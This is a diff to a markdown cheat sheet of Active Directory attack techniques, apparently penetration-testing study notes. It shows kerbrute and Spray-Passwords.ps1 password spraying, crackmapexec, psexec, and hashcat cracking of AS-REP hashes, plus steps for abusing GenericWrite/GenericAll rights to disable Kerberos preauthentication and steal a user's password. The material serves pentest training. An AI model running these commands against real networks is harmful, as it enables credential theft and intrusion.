@@ -94,7 +94,7 @@ crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_con
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
 
-- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1) (For LDAP and ADSI protocol)
+- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1) (For LDAP protocol)
   ```bash
   .\Spray-Passwords.ps1
   .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
@@ -275,10 +275,8 @@ psexec.exe -accepteula \\<remote_hostname> cmd
 ## Targeted AS-REP roasting
 
 ### on Kali
-- condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled && notice that we have GenericWrite or GenericAll permissions on another AD user account
-- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of *any* user to not require Kerberos preauthentication
-- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting, then **obtain their password** thru AS-REP hashes
-- Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash
+- condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled 
+- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting without using previously found password, then **obtain their password** thru AS-REP hashes
 
 kerbrute - Enumeration Users
 ```
@@ -308,6 +306,13 @@ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r usr/
 #copy to kali to run hash cat
 sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
+
+## Targeted AS-REP roasting
+### on Kali
+- condition: **cannot identify** any AD users with the account option "Do not require Kerberos preauthentication" enabled && notice that we have GenericWrite or GenericAll permissions on another AD user account
+- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of *any* user to not require Kerberos preauthentication
+- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting without using previously found password, then **obtain their password** thru AS-REP hashes
+- Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash
 
 ## Kerberoast  [STEAL ticket]
 <aside>
